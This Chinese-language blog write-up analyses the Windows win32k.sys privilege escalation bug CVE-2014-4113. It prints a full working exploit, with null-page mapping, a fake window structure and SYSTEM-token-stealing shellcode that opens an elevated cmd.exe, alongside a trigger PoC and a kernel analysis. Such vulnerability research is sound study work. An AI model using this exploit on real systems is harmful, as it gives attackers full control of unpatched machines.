# 一、漏洞简述

Microsoft
Windows下的win32k.sys是Windows子系统的内核部分，是一个内核模式设备驱动程序，它包含有窗口管理器、后者控制窗口显示和管理屏幕输出等。如果Windows内核模式驱动程序不正确地处理内存中的对象，则存在一个特权提升漏洞。成功利用此漏洞的攻击者可以运行内核模式中的任意代码。攻击者随后可安装程序；查看、更改或删除数据；或者创建拥有完全管理权限的新帐户。其中CVE-2014-4113就是Win32k.sys中的一个漏洞，该漏洞的根本问题是函数xxxMNFindWindowFromPoint的返回值验证不正确。xxxMNFindWindowFromPoint函数执行后返回win32k!tagWND的地址结构或错误代码-1，-5。在该函数后面将调用函数xxxSendMessage，xxxSendMessage把xxxMNFindWindowFromPoint的返回值作为参数传递。当xxxMNFindWindowFromPoint返回win32k!tagWND地址的时候程序正常执行，但当返回-1，-5的时候传递给xxxSendMessage将造成蓝屏。

# 二、环境准备

系统版本  
  
---  
  
win7x86sp1  
  
# 三、漏洞验证

这是一个提权漏洞，在GitHub上找的exp如下：

#include  
#include  
#define NT_SUCCESS(Status)(((NTSTATUS)(Status))>=0)  
  
typedefNTSTATUS  
(WINAPI*My_NtAllocateVirtualMemory)(  
IN HANDLE ProcessHandle,  
IN OUT PVOID*BaseAddress,  
IN ULONG ZeroBits,  
IN OUT PULONG RegionSize,  
IN ULONG AllocationType,  
IN ULONG Protect  
);  
  
My_NtAllocateVirtualMemory NtAllocateVirtualMemory =NULL;  
  
//Destroys the menu and then returns -5, this will be passed to xxxSendMessage
which will then use it as a pointer.  
LRESULT CALLBACK HookCallbackTwo(HWND hWnd,UINT Msg,WPARAM wParam,LPARAM
lParam)  
{  
printf("[+] Callback two called.\n");  
EndMenu();  
return-5;  
}  
  
LRESULT CALLBACK HookCallback(intcode,WPARAM wParam,LPARAM lParam){  
printf("[+] Callback one called.\n");  
/* lParam is a pointer to a CWPSTRUCT which is defined as:  
typedef struct tagCWPSTRUCT {  
LPARAM lParam;  
WPARAM wParam;  
UINT message;  
HWND hwnd;  
} CWPSTRUCT, *PCWPSTRUCT, *LPCWPSTRUCT;  
*/  
//lparam+8 is the message sent to the window, here we are checking for the
message which is sent to a window when the function xxxMNFindWindowFromPoint
is called  
if(*(DWORD*)(lParam +8)==0x1EB){  
if(UnhookWindowsHook(WH_CALLWNDPROC,HookCallback)){  
//lparam+12 is a Window Handle pointing to the window - here we are setting
its callback to be our second one  
SetWindowLongA(*(HWND*)(lParam +12),GWLP_WNDPROC,(LONG)HookCallbackTwo);  
}  
}  
returnCallNextHookEx(0,code,wParam,lParam);  
}  
  
/*  
LRESULT WINAPI DefWindowProc(  
_In_ HWND hWnd,  
_In_ UINT Msg,  
_In_ WPARAM wParam,  
_In_ LPARAM lParam  
);  
hWnd => Handle of the Window the event was triggered on  
Msg => Message, the event that has occurred, this could be that window has
moved, has been minimized, clicked on etc  
wParam, lParam => extra information depending on the msg recieved.  
*/  
LRESULT CALLBACK WndProc(HWND hwnd,UINT msg,WPARAM wParam,LPARAM lParam){  
/*  
Wait until the window is idle and then send the messages needed to 'click' on
the submenu to trigger the bug  
*/  
printf("[+] WindProc called with message=%d\n",msg);  
if(msg ==WM_ENTERIDLE){  
PostMessageA(hwnd,WM_KEYDOWN,VK_DOWN,0);  
PostMessageA(hwnd,WM_KEYDOWN,VK_RIGHT,0);  
PostMessageA(hwnd,WM_LBUTTONDOWN,0,0);  
}  
//Just pass any other messages to the default window procedure  
returnDefWindowProc(hwnd,msg,wParam,lParam);  
}  
  
VOID Poc()  
{  
/*  
typedef struct tagWNDCLASS {  
UINT style;  
WNDPROC lpfnWndProc;  
int cbClsExtra;  
int cbWndExtra;  
HINSTANCE hInstance;  
HICON hIcon;  
HCURSOR hCursor;  
HBRUSH hbrBackground;  
LPCTSTR lpszMenuName;  
LPCTSTR lpszClassName;  
} WNDCLASS, *PWNDCLASS;  
We don't care about any of the style information but we set any needed values
below.  
*/  
WNDCLASSA wnd_class ={0};  
//Our custome WndProc handler, inspects any window messages before passing
then onto the default handler  
wnd_class.lpfnWndProc =WndProc;  
//Returns a handle to the executable that has the name passed to it, passing
NULL means it returns a handle to this executable  
wnd_class.hInstance =GetModuleHandle(NULL);  
//Random classname - we reference this later when creating a Window of this
class  
wnd_class.lpszClassName ="abcde";  
  
//Registers the class in the global scope so it can be refered too later.  
ATOM tmp =RegisterClassA(&wnd_class);  
if(tmp ==NULL){  
printf("[+] Failed to register window class.\n");  
return;  
}  
  
/* Does what it says on the tin..  
HWND WINAPI CreateWindow(  
_In_opt_ LPCTSTR lpClassName, => The name of the Window class to be created,
in this case the class we just registered  
_In_opt_ LPCTSTR lpWindowName, => The name to give the window, we don't need
to give it a name.  
_In_ DWORD dwStyle, => Style options for the window, here  
_In_ int x, => x position to create the window,this time the left edge  
_In_ int y, => y position to create the window, this time the top edge  
_In_ int nWidth, => Width of the window to create, randomly chosen value  
_In_ int nHeight, => Height of the to create, randomly chosen value  
_In_opt_ HWND hWndParent, => A handle to the parent window, this is our only
window so NULL  
_In_opt_ HMENU hMenu, => A handle to a menu or sub window to attach to the
window, we havent created any yet.  
_In_opt_ HINSTANCE hInstance, => A handle to the module the window should be
associated with, for us this executable  
_In_opt_ LPVOID lpParam => A pointer to data to be passed to the Window with
the WM_CREATE message on creation, NULL for us as we don't wish to pass
anything.  
);  
*/  
HWND main_wnd =CreateWindowA(  
wnd_class.lpszClassName,  
"",  
WS_OVERLAPPEDWINDOW |WS_VISIBLE,  
0,  
0,  
640,  
480,  
NULL,  
NULL,  
wnd_class.hInstance,  
NULL);  
  
if(main_wnd ==NULL){  
printf("[+] Failed to create window instance.\n");  
return;  
}  
  
//Creates an empty popup menu  
HMENU MenuOne =CreatePopupMenu();  
  
if(MenuOne ==NULL){  
printf("[+] Failed to create popup menu one.\n");  
return;  
}  
  
/*Menu properties to apply to the empty menu we just created  
typedef struct tagMENUITEMINFO {  
UINT cbSize;  
UINT fMask;  
UINT fType;  
UINT fState;  
UINT wID;  
HMENU hSubMenu;  
HBITMAP hbmpChecked;  
HBITMAP hbmpUnchecked;  
ULONG_PTR dwItemData;  
LPTSTR dwTypeData;  
UINT cch;  
HBITMAP hbmpItem;  
} MENUITEMINFO, *LPMENUITEMINFO;  
*/  
MENUITEMINFOA MenuOneInfo ={0};  
//Default size  
MenuOneInfo.cbSize =sizeof(MENUITEMINFOA);  
//Selects what properties to retrieve or set when
GetMenuItemInfo/SetMenuItemInfo are called, in this case only dwTypeData which
the contents of the menu item.  
MenuOneInfo.fMask =MIIM_STRING;  
/*Inserts a new menu at the specified position  
BOOL WINAPI InsertMenuItem(  
_In_ HMENU hMenu, => Handle to the menu the new item should be inserted into,
in our case the empty menu we just created  
_In_ UINT uItem, => it should item 0 in the menu  
_In_ BOOL fByPosition, => Decided whether uItem is a position or an
identifier, in this case its a position. If FALSE it makes uItem an identifier  
_In_ LPCMENUITEMINFO lpmii => A pointer to the MENUITEMINFO structure that
contains the menu item details.  
);  
*/  
BOOL insertMenuItem =InsertMenuItemA(MenuOne,0,TRUE,&MenuOneInfo);  
  
if(!insertMenuItem){  
printf("[+] Failed to insert popup menu one.\n");  
DestroyMenu(MenuOne);  
return;  
}  
  
HMENU MenuTwo =CreatePopupMenu();  
  
if(MenuTwo ==NULL){  
printf("[+] Failed to create menu two.\n");  
DestroyMenu(MenuOne);  
return;  
}  
  
MENUITEMINFOA MenuTwoInfo ={0};  
MenuTwoInfo.cbSize =sizeof(MENUITEMINFOA);  
//On this window hSubMenu should be included in Get/SetMenuItemInfo  
MenuTwoInfo.fMask =(MIIM_STRING |MIIM_SUBMENU);  
//The menu is a sub menu of the first menu  
MenuTwoInfo.hSubMenu =MenuOne;  
//The contents of the menu item - in this case nothing  
MenuTwoInfo.dwTypeData =(LPSTR)"";  
//The length of the menu item text - in the case 1 for just a single NULL byte  
MenuTwoInfo.cch =1;  
insertMenuItem =InsertMenuItemA(MenuTwo,0,TRUE,&MenuTwoInfo);  
  
if(!insertMenuItem){  
printf("[+] Failed to insert second pop-up menu.\n");  
DestroyMenu(MenuOne);  
DestroyMenu(MenuTwo);  
return;  
}  
  
/*  
HHOOK WINAPI SetWindowsHookEx(  
_In_ int idHook, => The type of hook we want to create, in this case
WH_CALLWNDPROC which means that the callback will be passed any window
messages before the system sends them to the destination window procedure.  
_In_ HOOKPROC lpfn, => The callback that should be called when triggered  
_In_ HINSTANCE hMod, => If the hook functions is in a dll we pass a handle to
the dll here, not needed in this case.  
_In_ DWORD dwThreadId => The thread which the callback should be triggered in,
we want it to be our current thread.  
);  
*/  
HHOOK setWindowsHook =SetWindowsHookExA(  
WH_CALLWNDPROC,  
HookCallback,  
NULL,  
GetCurrentThreadId()  
);  
  
if(setWindowsHook ==NULL){  
printf("[+] Failed to insert call back one.\n");  
DestroyMenu(MenuOne);  
DestroyMenu(MenuTwo);  
return;  
}  
  
/* Displays a menu and tracks interactions with it.  
BOOL WINAPI TrackPopupMenu(  
_In_ HMENU hMenu,  
_In_ UINT uFlags,  
_In_ int x,  
_In_ int y,  
_In_ int nReserved,  
_In_ HWND hWnd,  
_In_opt_ const RECT *prcRect  
);  
*/  
TrackPopupMenu(  
MenuTwo,//Handle to the menu we want to display, for us its the submenu we
just created.  
0,//Options on how the menu is aligned, what clicks are allowed etc, we don't
care.  
0,//Horizontal position - left hand side  
0,//Vertical position - Top edge  
0,//Reserved field, has to be 0  
main_wnd,//Handle to the Window which owns the menu  
NULL //This value is always ignored...  
);  
  
DestroyWindow(main_wnd);  
}  
  
int__stdcall
ShellCode(intparameter1,intparameter2,intparameter3,intparameter4)  
{  
_asm  
{  
pushad  
mov eax,fs:[124h]// Find the _KTHREAD structure for the current thread  
mov eax,[eax +0x50]// Find the _EPROCESS structure  
mov ecx,eax  
mov edx,4// edx = system PID(4)  
  
// The loop is to get the _EPROCESS of the system  
find_sys_pid :  
mov eax,[eax +0xb8]// Find the process activity list  
sub eax,0xb8// List traversal  
cmp[eax +0xb4],edx // Determine whether it is SYSTEM based on PID  
jnz find_sys_pid  
  
// Replace the Token  
mov edx,[eax +0xf8]  
mov[ecx +0xf8],edx  
popad  
}  
return0;  
}  
  
  
staticVOID CreateCmd()  
{  
STARTUPINFO si ={sizeof(si)};  
PROCESS_INFORMATION pi ={0};  
si.dwFlags =STARTF_USESHOWWINDOW;  
si.wShowWindow =SW_SHOW;  
WCHAR wzFilePath[MAX_PATH]={L"cmd.exe"};  
BOOL bReturn
=CreateProcessW(NULL,wzFilePath,NULL,NULL,FALSE,CREATE_NEW_CONSOLE,NULL,NULL,(LPSTARTUPINFOW)&si,&pi);  
if(bReturn)CloseHandle(pi.hThread),CloseHandle(pi.hProcess);  
}  
  
DWORD __stdcall ptiCurrent()  
{  
__asm {  
mov eax,fs:18h//eax pointer to TEB  
mov eax,[eax +40h]//get pointer to Win32ThreadInfo  
}  
}  
  
VOID init()  
{  
*(FARPROC*)&NtAllocateVirtualMemory =GetProcAddress(  
GetModuleHandleW(L"ntdll"),  
"NtAllocateVirtualMemory");  
  
if(NtAllocateVirtualMemory ==NULL)  
{  
printf("[+] Failed to get function NtAllocateVirtualMemory!!!\n");  
system("pause");  
return;  
}  
  
PVOID Zero_addr =(PVOID)1;  
SIZE_T RegionSize =0x1000;  
  
printf("[+] Started to alloc zero page...\n");  
if(!NT_SUCCESS(NtAllocateVirtualMemory(  
INVALID_HANDLE_VALUE,  
&Zero_addr,  
0,  
&RegionSize,  
MEM_COMMIT |MEM_RESERVE,  
PAGE_READWRITE))||Zero_addr !=NULL)  
{  
printf("[+] Failed to alloc zero page!\n");  
system("pause");  
return;  
}  
  
printf("[+] Success to alloc zero page...\n");  
  
*(DWORD*)(0x3)=(DWORD)ptiCurrent();  
*(DWORD*)(0x11)=(DWORD)4;  
*(DWORD*)(0x5b)=(DWORD)&ShellCode;  
  
}  
  
intmain()  
{  
init();  
  
Poc();  
  
CreateCmd();  
  
system("pause");  
  
return0;  
}

在VS中生成，拖入虚拟机中，首先普通模式打开cmd，查看权限：

![](https://image.3001.net/images/20230420/1681997890_644140424983686c77a2d.png!small)

接下来运行exp：

![](https://image.3001.net/images/20230420/1681997894_644140461ca7d213cd676.png!small)

![](https://image.3001.net/images/20230420/1681997897_64414049c434cd0c21159.png!small)

  
可以看到已经是系统权限了。

# 四、漏洞分析

从POC开始分析吧，代码如下：

#include  
#include  
  
//Destroys the menu and then returns -5, this will be passed to xxxSendMessage
which will then use it as a pointer.  
LRESULT CALLBACK HookCallbackTwo(HWND hWnd,UINT Msg,WPARAM wParam,LPARAM
lParam)  
{  
printf("[+] Callback two called.\n");  
EndMenu();  
return-5;  
}  
  
LRESULT CALLBACK HookCallback(intcode,WPARAM wParam,LPARAM lParam){  
printf("[+] Callback one called.\n");  
/* lParam is a pointer to a CWPSTRUCT which is defined as:  
typedef struct tagCWPSTRUCT {  
LPARAM lParam;  
WPARAM wParam;  
UINT message;  
HWND hwnd;  
} CWPSTRUCT, *PCWPSTRUCT, *LPCWPSTRUCT;  
*/  
//lparam+8 is the message sent to the window, here we are checking for the
message which is sent to a window when the function xxxMNFindWindowFromPoint
is called  
if(*(DWORD*)(lParam +8)==0x1EB){  
if(UnhookWindowsHook(WH_CALLWNDPROC,HookCallback)){  
//lparam+12 is a Window Handle pointing to the window - here we are setting
its callback to be our second one  
SetWindowLongA(*(HWND*)(lParam +12),GWLP_WNDPROC,(LONG)HookCallbackTwo);  
}  
}  
returnCallNextHookEx(0,code,wParam,lParam);  
}  
  
/*  
LRESULT WINAPI DefWindowProc(  
_In_ HWND hWnd,  
_In_ UINT Msg,  
_In_ WPARAM wParam,  
_In_ LPARAM lParam  
);  
hWnd => Handle of the Window the event was triggered on  
Msg => Message, the event that has occurred, this could be that window has
moved, has been minimized, clicked on etc  
wParam, lParam => extra information depending on the msg recieved.  
*/  
LRESULT CALLBACK WndProc(HWND hwnd,UINT msg,WPARAM wParam,LPARAM lParam){  
/*  
Wait until the window is idle and then send the messages needed to 'click' on
the submenu to trigger the bug  
*/  
printf("[+] WindProc called with message=%d\n",msg);  
if(msg ==WM_ENTERIDLE){  
PostMessageA(hwnd,WM_KEYDOWN,VK_DOWN,0);  
PostMessageA(hwnd,WM_KEYDOWN,VK_RIGHT,0);  
PostMessageA(hwnd,WM_LBUTTONDOWN,0,0);  
}  
//Just pass any other messages to the default window procedure  
returnDefWindowProc(hwnd,msg,wParam,lParam);  
}  
  
VOID Poc()  
{  
/*  
typedef struct tagWNDCLASS {  
UINT style;  
WNDPROC lpfnWndProc;  
int cbClsExtra;  
int cbWndExtra;  
HINSTANCE hInstance;  
HICON hIcon;  
HCURSOR hCursor;  
HBRUSH hbrBackground;  
LPCTSTR lpszMenuName;  
LPCTSTR lpszClassName;  
} WNDCLASS, *PWNDCLASS;  
We don't care about any of the style information but we set any needed values
below.  
*/  
WNDCLASSA wnd_class ={0};  
//Our custome WndProc handler, inspects any window messages before passing
then onto the default handler  
wnd_class.lpfnWndProc =WndProc;  
//Returns a handle to the executable that has the name passed to it, passing
NULL means it returns a handle to this executable  
wnd_class.hInstance =GetModuleHandle(NULL);  
//Random classname - we reference this later when creating a Window of this
class  
wnd_class.lpszClassName ="abcde";  
  
//Registers the class in the global scope so it can be refered too later.  
ATOM tmp =RegisterClassA(&wnd_class);  
if(tmp ==NULL){  
printf("[+] Failed to register window class.\n");  
return;  
}  
  
/* Does what it says on the tin..  
HWND WINAPI CreateWindow(  
_In_opt_ LPCTSTR lpClassName, => The name of the Window class to be created,
in this case the class we just registered  
_In_opt_ LPCTSTR lpWindowName, => The name to give the window, we don't need
to give it a name.  
_In_ DWORD dwStyle, => Style options for the window, here  
_In_ int x, => x position to create the window,this time the left edge  
_In_ int y, => y position to create the window, this time the top edge  
_In_ int nWidth, => Width of the window to create, randomly chosen value  
_In_ int nHeight, => Height of the to create, randomly chosen value  
_In_opt_ HWND hWndParent, => A handle to the parent window, this is our only
window so NULL  
_In_opt_ HMENU hMenu, => A handle to a menu or sub window to attach to the
window, we havent created any yet.  
_In_opt_ HINSTANCE hInstance, => A handle to the module the window should be
associated with, for us this executable  
_In_opt_ LPVOID lpParam => A pointer to data to be passed to the Window with
the WM_CREATE message on creation, NULL for us as we don't wish to pass
anything.  
);  
*/  
HWND main_wnd =CreateWindowA(  
wnd_class.lpszClassName,  
"",  
WS_OVERLAPPEDWINDOW |WS_VISIBLE,  
0,  
0,  
640,  
480,  
NULL,  
NULL,  
wnd_class.hInstance,  
NULL);  
  
if(main_wnd ==NULL){  
printf("[+] Failed to create window instance.\n");  
return;  
}  
  
//Creates an empty popup menu  
HMENU MenuOne =CreatePopupMenu();  
  
if(MenuOne ==NULL){  
printf("[+] Failed to create popup menu one.\n");  
return;  
}  
  
/*Menu properties to apply to the empty menu we just created  
typedef struct tagMENUITEMINFO {  
UINT cbSize;  
UINT fMask;  
UINT fType;  
UINT fState;  
UINT wID;  
HMENU hSubMenu;  
HBITMAP hbmpChecked;  
HBITMAP hbmpUnchecked;  
ULONG_PTR dwItemData;  
LPTSTR dwTypeData;  
UINT cch;  
HBITMAP hbmpItem;  
} MENUITEMINFO, *LPMENUITEMINFO;  
*/  
MENUITEMINFOA MenuOneInfo ={0};  
//Default size  
MenuOneInfo.cbSize =sizeof(MENUITEMINFOA);  
//Selects what properties to retrieve or set when
GetMenuItemInfo/SetMenuItemInfo are called, in this case only dwTypeData which
the contents of the menu item.  
MenuOneInfo.fMask =MIIM_STRING;  
/*Inserts a new menu at the specified position  
BOOL WINAPI InsertMenuItem(  
_In_ HMENU hMenu, => Handle to the menu the new item should be inserted into,
in our case the empty menu we just created  
_In_ UINT uItem, => it should item 0 in the menu  
_In_ BOOL fByPosition, => Decided whether uItem is a position or an
identifier, in this case its a position. If FALSE it makes uItem an identifier  
_In_ LPCMENUITEMINFO lpmii => A pointer to the MENUITEMINFO structure that
contains the menu item details.  
);  
*/  
BOOL insertMenuItem =InsertMenuItemA(MenuOne,0,TRUE,&MenuOneInfo);  
  
if(!insertMenuItem){  
printf("[+] Failed to insert popup menu one.\n");  
DestroyMenu(MenuOne);  
return;  
}  
  
HMENU MenuTwo =CreatePopupMenu();  
  
if(MenuTwo ==NULL){  
printf("[+] Failed to create menu two.\n");  
DestroyMenu(MenuOne);  
return;  
}  
  
MENUITEMINFOA MenuTwoInfo ={0};  
MenuTwoInfo.cbSize =sizeof(MENUITEMINFOA);  
//On this window hSubMenu should be included in Get/SetMenuItemInfo  
MenuTwoInfo.fMask =(MIIM_STRING |MIIM_SUBMENU);  
//The menu is a sub menu of the first menu  
MenuTwoInfo.hSubMenu =MenuOne;  
//The contents of the menu item - in this case nothing  
MenuTwoInfo.dwTypeData =(LPSTR)"";  
//The length of the menu item text - in the case 1 for just a single NULL byte  
MenuTwoInfo.cch =1;  
insertMenuItem =InsertMenuItemA(MenuTwo,0,TRUE,&MenuTwoInfo);  
  
if(!insertMenuItem){  
printf("[+] Failed to insert second pop-up menu.\n");  
DestroyMenu(MenuOne);  
DestroyMenu(MenuTwo);  
return;  
}  
  
/*  
HHOOK WINAPI SetWindowsHookEx(  
_In_ int idHook, => The type of hook we want to create, in this case
WH_CALLWNDPROC which means that the callback will be passed any window
messages before the system sends them to the destination window procedure.  
_In_ HOOKPROC lpfn, => The callback that should be called when triggered  
_In_ HINSTANCE hMod, => If the hook functions is in a dll we pass a handle to
the dll here, not needed in this case.  
_In_ DWORD dwThreadId => The thread which the callback should be triggered in,
we want it to be our current thread.  
);  
*/  
HHOOK setWindowsHook =SetWindowsHookExA(  
WH_CALLWNDPROC,  
HookCallback,  
NULL,  
GetCurrentThreadId()  
);  
  
if(setWindowsHook ==NULL){  
printf("[+] Failed to insert call back one.\n");  
DestroyMenu(MenuOne);  
DestroyMenu(MenuTwo);  
return;  
}  
  
/* Displays a menu and tracks interactions with it.  
BOOL WINAPI TrackPopupMenu(  
_In_ HMENU hMenu,  
_In_ UINT uFlags,  
_In_ int x,  
_In_ int y,  
_In_ int nReserved,  
_In_ HWND hWnd,  
_In_opt_ const RECT *prcRect  
);  
*/  
TrackPopupMenu(  
MenuTwo,//Handle to the menu we want to display, for us its the submenu we
just created.  
0,//Options on how the menu is aligned, what clicks are allowed etc, we don't
care.  
0,//Horizontal position - left hand side  
0,//Vertical position - Top edge  
0,//Reserved field, has to be 0  
main_wnd,//Handle to the Window which owns the menu  
NULL //This value is always ignored...  
);  
}  
  
intmain()  
{  
Poc();  
return0;  
}

编译成exe拖入虚拟机运行，打开双击调试：

![](https://image.3001.net/images/20230420/1681997900_6441404c96769ac645578.png!small)

卡在这里，看箭头位置：

![](https://image.3001.net/images/20230420/1681997901_6441404d65370c0fa8edf.png!small)

可以看到esi的值是传入的参数，上层函数是xxxSendMessage，参数同样是fffffffb：

![](https://image.3001.net/images/20230420/1681997902_6441404e34620790d3c6d.png!small)

直接在win32k.sys追xxxHandleMenuMessages，当然记得加载符号文件：

![](https://image.3001.net/images/20230420/1681997902_6441404ed494db685340e.png!small)

通过xxxHandleMenuMessages+0x582的地址，F5到此处：

![](https://image.3001.net/images/20230420/1681997903_6441404fd3fa80770a3b2.png!small)

LABEL_13:  
v12 = a2;  
*(_DWORD*)(a2\+ 16) = -1;  
*(_DWORD*)(a2\+ 8) = (signed __int16)v7;  
*(_DWORD*)(a2\+ 12) = SHIWORD(v7);  
v13 = xxxMNFindWindowFromPoint((WCHAR)v3, (int)&UnicodeString, v7);  
v52 = IsMFMWFPWindow(v13);  
if ( v52 )  
{  
v46 = *((_DWORD*)gptiCurrent\+ 45);  
*((_DWORD*)gptiCurrent\+ 45) = &ampv46  
v47 = v13;  
if ( v13 )  
++*(_DWORD*)(v13\+ 4);  
}  
if ( *(_DWORD *)(v12 + 4) & 0x400 )  
{  
*(_DWORD*)(v12\+ 36) = *(_DWORD*)(v12\+ 8);  
*(_DWORD*)(v12\+ 40) = *(_DWORD*)(v12\+ 12);  
*(_DWORD*)(v12\+ 48) = UnicodeString;  
LockMFMWFPWindow(v12 + 44,v13);  
}  
if ( *(_DWORD *)(v12 + 4) & 0x500 )  
*(_DWORD*)(v12\+ 52) = ((v50 & 2) != 0) + 1;  
if ( !v13 && !UnicodeString )  
goto LABEL_22;  
if ( *(_BYTE *)v3 & 2 && v13 == -5 )  
{  
xxxMNSwitchToAlternateMenu(v3);  
v13 = -1;  
}  
if ( v13 == -1 )  
xxxMNButtonDown(v3, v12, UnicodeString, 1);  
else  
xxxSendMessage((PVOID)v13, -19, UnicodeString, 0);  
if ( !(*(_DWORD *)(v12 + 4) & 0x100) )  
xxxMNRemoveMessage(*(_DWORD *)(a1 + 4), 516);

可以看到esi的值主要来源于v13 = xxxMNFindWindowFromPoint((WCHAR)v3, (int)&UnicodeString,
v7);  
v52 = IsMFMWFPWindow(v13)：此函数判断值是否是-5和-1，不是的话返回1：

BOOL __stdcall IsMFMWFPWindow(inta1)  
{  
returna1 &&a1 !=-5&&a1 !=-1;  
}

而如果要执行xxxSendMessage这个函数，就需要让v13的值等于-5（FFFFFFFB），我们看xxxMNFindWindowFromPoint这个函数：

![](https://image.3001.net/images/20230420/1681997904_64414050cef520ff7e8bc.png!small)

这里反编译有问题，直接看汇编：

![](https://image.3001.net/images/20230420/1681997905_64414051a857369510643.png!small)

这里判断呢，就是发送消息是1ED这里，然后判断是不是-1或者-5就跳过if，所以这里需要跳过if，否则返回值会重新赋值，然后-1的话触发不了漏洞，只能-5，也就是HOOK这里，让这个返回值-5，触发漏洞。  
接下来根据POC简单梳理一下过程：  
调用了TrackPopupMenu函数触发漏洞，然后调用内核函数win32k!xxxTrackPopupMenuEx，最后调用最终会调用win32k!
xxxMNLoop函数，然后就跟进win32k!xxxHandleMenuMessages函数，随后就是我们分析的情况。触发漏洞需要让xxxMNFindWindowFromPoint返回值=-5；

# 五、漏洞利用

在POC中，对于消息号为0x1EB的消息，HOOK函数返回了0xFFFFFFFB，而程序把该值作为win32k!tagWND结构处理，导致后边把0xFFFFFFFB作为win32k!ptagWND结构传给win32k!
xxxSendMessage。在win32k!
xxxSendMessage中会调用win32k!xxxSendMessageTimeout，在win32k!xxxSendMessageTimeout中当把0xFFFFFFFB作为win32k!tagWND结构处理时，会调用ptagWND+0x60处的函数，也就是call
[0xFFFFFFB+0x60]，在xxxSendMessageTimeout中，即call [0x5B]。  
如果在0x5B位置布置shellcode，就可以完成漏洞利用，下面还要注意一个点，是xxxSendMessageTimeout函数内部的俩个验证，所以我们需要布局0x3,0x11位置：  
  
通过函数ZwAllocateVirtualMemory申请0页内存空间，在该空间建立一个畸形的win32k!tagWND结构的映射页，使得在内核能正确地验证。并将shellcode地址布置在0x5B。而shellcode就是创建cmd，把进程Token换成system的Token值。至于钩子为什么使用SetWindowLongA设置了一次窗口函数，因为只有在窗口处理函数线程的上下文空间中调用EndMenu函数才有意义。补充一点exp调用sendMessage函数是分同步异步，这里不再多说，可以看这里：https://www.anquanke.com/post/id/84869

